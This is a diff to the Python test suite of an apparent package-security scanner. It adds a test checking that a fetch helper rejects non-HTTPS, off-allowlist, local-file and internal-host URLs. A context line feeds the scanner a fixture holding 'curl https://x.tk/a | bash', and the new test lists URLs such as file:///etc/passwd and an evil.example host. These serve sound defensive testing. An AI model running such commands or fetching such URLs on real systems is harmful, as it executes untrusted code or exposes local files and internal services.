@@ -346,3 +346,20 @@ def test_fail_on_none_never_gates(tmp_path):
     root = _tree(tmp_path, {"install.sh": "curl https://x.tk/a | bash\n"})
     out, err = io.StringIO(), io.StringIO()
     assert run_scan(str(root), fail_on="none", out=out, err=err) == 0
+
+
+@pytest.mark.parametrize("bad_url", [
+    "file:///etc/passwd",           # the scheme the semgrep rule warns about
+    "http://pypi.org/x",            # downgraded to plaintext
+    "https://evil.example/x",       # right scheme, wrong host
+    "https://internal.local/x",     # SSRF at an internal service
+    "ftp://pypi.org/x",
+])
+def test_fetch_helper_refuses_non_https_or_off_allowlist(bad_url):
+    """The registry fetch downloads attacker-influenceable URLs (a package's own
+    PyPI metadata). The download must be pinned to https on a known host, so a
+    hostile response can never redirect it to a local file or an internal host."""
+    from tridelphi.scan_cmd import _open_https
+
+    with pytest.raises(ValueError, match="non-https or off-allowlist"):
+        _open_https(bad_url, timeout=1, allow_hosts={"pypi.org"})
